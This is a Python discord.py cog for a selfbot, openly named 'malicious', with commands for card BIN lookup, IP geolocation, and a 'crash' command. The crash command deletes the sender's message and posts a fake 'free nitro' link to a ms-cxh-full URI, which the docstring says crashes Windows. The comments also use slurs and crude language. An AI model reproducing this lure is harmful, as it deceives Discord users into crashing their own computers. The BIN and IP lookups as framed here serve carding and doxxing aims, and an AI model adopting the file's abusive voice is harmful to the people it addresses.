import discord
import asyncio
from discord.ext import commands
import requests
import json
import urllib.request, json


class malicious(commands.Cog):
    """Uhhh discord coding is shit"""

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def bin(self, ctx, message):
        """Shows basic info about the given bin number
        Note: Can only be used 10 times per 10 minutes


        Paramaters
        • bin - the fucking bin number
        """
        bin = message
        lookup = "https://lookup.binlist.net/" + bin
        with urllib.request.urlopen(lookup) as url:
            data = json.loads(url.read().decode())

        ### Parse json response
        sch = data["scheme"]
        type = data["type"]
        brand = data["brand"]
        prepd = data["prepaid"]
        country = data["country"]["name"]
        bankname = data["bank"]["name"]
        site = data["bank"]["url"]
        phone = data["bank"]["phone"]
        city = data["bank"]["city"]

        ### Make embed
        embed = discord.Embed(title=bin, color=0xFF0000)
        embed.set_author(name="Bin Lookup for")
        embed.set_thumbnail(url="https://i.imgur.com/E5YiHfL.png")
        embed.add_field(name="===============", value="===============", inline=False)
        embed.add_field(name="Scheme:", value=sch, inline=False)
        embed.add_field(name="Type:", value=type, inline=False)
        embed.add_field(name="Brand:", value=brand, inline=False)
        embed.add_field(name="Prepaid:", value=prepd, inline=False)
        embed.add_field(name="Country:", value=country, inline=False)
        embed.add_field(name="Bank:", value=bankname, inline=False)
        embed.add_field(name="Website:", value=site, inline=False)
        embed.add_field(name="Phone:", value=phone, inline=False)
        embed.add_field(name="City:", value=city, inline=False)
        embed.set_footer(text="Quite possibly the shittest selfbot made by Daddie#6969")

        await ctx.send(embed=embed)

    @commands.command()
    async def ip(self, ctx, message):
        """Shows you basic info about the ip provided

        Paramaters
        • ip - the fucking ip retard
        """
        ip = message

        lookup = (
            "http://ip-api.com/json/"
            + ip
            + "?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
        )
        with urllib.request.urlopen(lookup) as url:
            data = json.loads(url.read().decode())

        ### Store vars
        sts = data["status"]
        if sts == "fail":
            embed = discord.Embed(title="Error looking up " + ip, color=0xFF0000)
            embed.set_thumbnail(
                url="https://iconsplace.com/wp-content/uploads/_icons/ff0000/256/png/error-icon-14-256.png"
            )
            embed.add_field(
                name="\nDouble check you've written the ip properly\n\nError:",
                value=data["message"],
            )
            await ctx.send(embed=embed)
        else:
            country = data["country"]
            region = data["regionName"]
            city = data["city"]
            zip = data["zip"] + " (note this is often inaccurate)"
            isp = data["isp"]

            ### Make embed
            embed = discord.Embed(
                title="Ip lookup for",
                url="https://ip-api.com/" + ip,
                description=ip,
                color=0xFF0000,
            )
            embed.set_thumbnail(
                url="http://1.bp.blogspot.com/-bmO8Bt7JW9A/Tok6psbeL-I/AAAAAAAAATY/s6Y-Ysqd2Xc/s1600/500px-IP.svg_.png"
            )
            embed.add_field(
                name="____________", value="__________________________", inline=False
            )
            embed.add_field(name="Country:", value=country, inline=False)
            embed.add_field(name="Region:", value=region, inline=False)
            embed.add_field(name="City:", value=city, inline=False)
            embed.add_field(name="Zip:", value=zip, inline=False)
            embed.add_field(name="ISP:", value=isp, inline=False)
            embed.add_field(
                name="______________", value="________________", inline=False
            )
            embed.set_footer(
                text="Quite possibly the shittest selfbot made by Daddie#6969"
            )

            ### Send message
            await ctx.send(embed=embed)

    @commands.command()
    async def crash(self, ctx):
        """Sends a link when clicked rapes a windwos computer"""
        await ctx.message.delete()
        await ctx.send("Click this for free nitro! <ms-cxh-full://0>")


### Discord blockbypass coming soon. Creds to Yaekith for that shit
# @commands.command()


def setup(bot):
    bot.add_cog(malicious(bot))
